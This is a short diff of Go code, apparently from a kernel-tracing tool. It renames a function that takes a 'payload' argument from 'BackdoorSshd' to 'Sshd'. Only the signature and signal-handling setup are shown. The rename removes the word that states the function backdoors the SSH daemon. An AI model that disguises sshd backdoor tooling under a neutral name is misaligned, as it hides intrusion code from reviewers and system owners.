@@ -17,7 +17,7 @@ const (
 
 // Name of the kernel function to trace.
 
-func BackdoorSshd(payload string) (err error) {
+func Sshd(payload string) (err error) {
 	stopper := make(chan os.Signal, 1)
 	signal.Notify(stopper, os.Interrupt, syscall.SIGTERM)
 
